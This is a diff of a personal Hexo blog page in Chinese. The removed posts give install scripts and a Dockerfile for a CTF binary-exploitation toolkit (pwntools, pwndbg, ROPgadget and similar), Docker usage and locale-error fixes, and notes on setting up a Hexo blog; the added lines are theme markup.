+<p>blog init</p>
 </blockquote>
-<ul>
-<li>root下使用，但是普通用户无法使用<code>gdb插件</code>功能，因为gdbinit文件的位置，我们可以复制一份到自己的用户目录下<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line"></span><br><span class="line">apt-get install -y patchelf</span><br><span class="line">apt-get install -y wget</span><br><span class="line">apt-get install -y zip</span><br><span class="line">apt-get install -y tzdata</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y --fix-missing python3 python3-pip python3-dev lib32z1 \</span><br><span class="line">	xinetd curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line">	vim netcat iputils-ping cpio file net-tools socat ruby ruby-dev locales \</span><br><span class="line">	autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line">	gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># python工具</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper z3-solver angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwngdb</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuapt-getx/Pwngdb.git </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> ~/Pwngdb/.gdbinit &gt;&gt; ~/.gdbinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># gem源</span></span><br><span class="line">gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># seccomp-tools</span></span><br><span class="line">gem install seccomp-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget</span></span><br><span class="line">gem install one_gadget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwninit</span></span><br><span class="line">apt-get install liblzma-dev pkgconf</span><br><span class="line">apt-get install cargo</span><br><span class="line">cargo install pwninit</span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install docker.io</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu 自己选择</span></span><br><span class="line"><span class="comment"># apt-get install qemu qemu-system qemu-user-static binfmt-support</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><ul>
-<li><p>搭建更加容易</p>
-</li>
-<li><p>由于某些题目没有Libc版本，而是给出了Dockerfile。或者说，不想下载虚拟机。</p>
-<ul>
-<li>glibc-all-in-one 下载一个libc 进行patch(但是<code>patchelf</code>容易导致程序破坏).</li>
-<li>自己的docker环境</li>
-</ul>
-</li>
-<li><p>docker环境搭建: 更改VERSION就行，禁止交互。</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ARG</span> VERSION=<span class="number">20.04</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:$VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> DEBIAN_FRONTEND noninteractive </span><br><span class="line"><span class="comment"># ENV TZ=Asia/Shanghai</span></span><br><span class="line"><span class="comment">########## solve some error ##############</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./pwninit.sh /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /root/pwninit.sh &amp;&amp; /root/pwninit</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>pwninit: 只需要安装部分工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">apt-get install -y libncursesw5-dev libgdbm-dev libc6-dev openssl</span><br><span class="line">apt-get install -y python3 python3-pip python3-dev lib32z1 \</span><br><span class="line">	curl gcc gdb gdbserver g++ git libssl-dev libffi-dev build-essential tmux \</span><br><span class="line">	vim netcat iputils-ping cpio file net-tools locales \</span><br><span class="line">	autoconf automake libtool make zsh openssh-server openssh-client \</span><br><span class="line">	gdb-multiarch bison clang</span><br><span class="line"></span><br><span class="line"><span class="comment"># others</span></span><br><span class="line">python3 -m pip install capstone filebytes unicorn keystone-engine ropper</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools</span></span><br><span class="line"><span class="comment"># 换源，可选</span></span><br><span class="line"><span class="comment"># pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line">python3 -m pip install --upgrade pip </span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">python3 -m pip install ROPgadget</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg</span></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line"><span class="built_in">cd</span> pwndbg </span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>创建一个容器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -h &lt;repo&gt;:&lt;tag&gt; .</span><br><span class="line"><span class="comment"># -f 指定dockerfile</span></span><br><span class="line"><span class="comment"># repo 形式 xxx/xxx</span></span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>进入docker</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:VERSION /bin/bash</span><br><span class="line"><span class="comment"># -v dir:dir 共享文件夹</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>docker 命令</p>
-<ul>
-<li>-i: 交互式</li>
-<li>-t: terminl</li>
-<li>-v hostDir:dockerDir 共享文件夹</li>
-<li>ps -a: 查看所有的容器</li>
-</ul>
-</li>
-<li><p>停止后重新计入容器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker start &lt;ID&gt;</span><br><span class="line">docker attach &lt;ID&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>停止容器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;ID&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>删除容器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;ID&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>删除镜像</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi &lt;ID&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="报错处理"><a href="#报错处理" class="headerlink" title="报错处理"></a>报错处理</h4><ul>
-<li><p>error 1</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">******</span><br><span class="line">Your encoding (ANSI_X3.4-1968) is different than UTF-8. pwndbg might not work properly.</span><br><span class="line">You might try launching gdb with:</span><br><span class="line">    LC_ALL=en_US.UTF-8 PYTHONIOENCODING=UTF-8 gdb</span><br><span class="line">Make sure that en_US.UTF-8 is activated <span class="keyword">in</span> /etc/locale.gen and you called locale-gen</span><br><span class="line">******</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>error 2</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/gdbinit.py&quot;</span>, line 58, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    import pwndbg  <span class="comment"># noqa: F401</span></span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/__init__.py&quot;</span>, line 86, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    config_mod.init_params()</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 159, <span class="keyword">in</span> init_params</span><br><span class="line">    Parameter(p)</span><br><span class="line">  File <span class="string">&quot;/root/pwndbg/pwndbg/gdblib/config.py&quot;</span>, line 45, <span class="keyword">in</span> __init__</span><br><span class="line">    self.value = param.value</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br><span class="line"><span class="string">------- tip of the day (disable with set show-tips off) -------</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>出现了如上错误。寻找到一个(issue)[<a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg/issues/1539]">https://github.com/pwndbg/pwndbg/issues/1539]</a></p>
-</li>
-<li><p>error1，修改dockerfile的类似如下变量。选择中国</p>
-</li>
-<li><p>error2  也解决了。</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ENV LANG en_US.utf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们的设置</span></span><br><span class="line"><span class="comment"># 定义时区参数</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;$TZ&#x27;</span> &gt; /etc/timezone</span></span><br><span class="line"><span class="comment"># 设置编码</span></span><br><span class="line"><span class="keyword">ENV</span> LANG C.UTF-<span class="number">8</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h4><ul>
-<li>创建多个docker。</li>
-</ul></div><a class="article-more button is-small is-size-7" href="/2023/06/05/Pwn%20init/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-03-19T05:03:15.847Z" title="2023/3/19 13:03:15">2023-03-19</time>发表</span><span class="level-item"><time dateTime="2023-07-28T15:25:24.293Z" title="2023/7/28 23:25:24">2023-07-28</time>更新</span><span class="level-item"><a class="link-muted" href="/categorievariants/misc/">misc</a></span><span class="level-item">2 分钟读完 (大约300个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/03/19/init-blog/">init-blog</a></p><div class="content"><h1 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
-<li>github + hexo</li>
-</ul>
-<h3 id="hexo使用"><a href="#hexo使用" class="headerlink" title="hexo使用"></a>hexo使用</h3><ul>
-<li><p><code>hexo</code> 命令报错，上网查，使用 <code>npx hexo</code></p>
-</li>
-<li><p>插件下载</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>常用命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">npx hexo init <span class="comment"># 初始化一个仓库</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># 静态界面生成</span></span><br><span class="line">npx hexo s   <span class="comment"># 本地启动 service</span></span><br><span class="line">npx hexo d   <span class="comment"># 插件。传到github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># 生成目录</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#生成文章</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>常用属性</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title: 标题， 使用 &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: 日期, 使用 &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: 更新</span><br><span class="line">tags: 标签</span><br><span class="line">categories: 分类</span><br><span class="line">comments: 开启评论 <span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><ul>
-<li>obsidian 写md</li>
-<li>vscode</li>
-</ul>
-<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><blockquote>
-<p>简约的主题</p>
-</blockquote>
-<p><code>https://hexo.io/themes/index.html</code> 网站</p></div><a class="article-more button is-small is-size-7" href="/2023/03/19/init-blog/#more">阅读更多</a></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/h.png" alt="hy"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">hy</p><p class="is-size-6 is-block">My blog</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">6</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/Ha0-Y/" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/Ha0-Y/"><i class="fab fa-github"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/Ha0-Y/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">mygithub</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categorievariants/CS/"><span class="level-start"><span class="level-item">CS</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categorievariants/asm/"><span class="level-start"><span class="level-item">asm</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categorievariants/db/"><span class="level-start"><span class="level-item">db</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categorievariants/kernel-uaf/"><span class="level-start"><span class="level-item">kernel uaf</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categorievariants/misc/"><span class="level-start"><span class="level-item">misc</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categorievariants/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-07-28T07:57:40.221Z">2023-07-28</time></p><p class="title"><a href="/2023/07/28/peekgeek%20mmsg/">peekgeek mmsg</a></p><p class="categories"><a href="/categorievariants/kernel-uaf/">kernel uaf</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-30T02:49:11.489Z">2023-06-30</time></p><p class="title"><a href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">常用数据库基本语法</a></p><p class="categories"><a href="/categorievariants/db/">db</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-19T02:54:28.071Z">2023-06-19</time></p><p class="title"><a href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/">计算机教育缺失的一课</a></p><p class="categories"><a href="/categorievariants/CS/">CS</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-10T11:50:08.095Z">2023-06-10</time></p><p class="title"><a href="/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/">汇编学习</a></p><p class="categories"><a href="/categorievariants/asm/">asm</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-06-05T02:16:53.446Z">2023-06-05</time></p><p class="title"><a href="/2023/06/05/Pwn%20init/">pwn init</a></p><p class="categories"><a href="/categorievariants/pwn/">pwn</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CS/"><span class="tag">CS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/asm/"><span class="tag">asm</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blog/"><span class="tag">blog</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/db/"><span class="tag">db</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kernel-pwn/"><span class="tag">kernel pwn</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.png" alt="haoy&#039;s blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 haoy</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">❤️❤️❤️</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "此网站使用Cookie来改善您的体验。",
-          dismiss: "知道了！",
-          allow: "允许使用Cookie",
-          deny: "拒绝",
-          link: "了解更多",
-          policy: "Cookie政策",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
-        });</script></body></html>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/19/init-blog/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Ha0Y</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Ha0-Y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ha0-Y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ha0Y</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">45k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
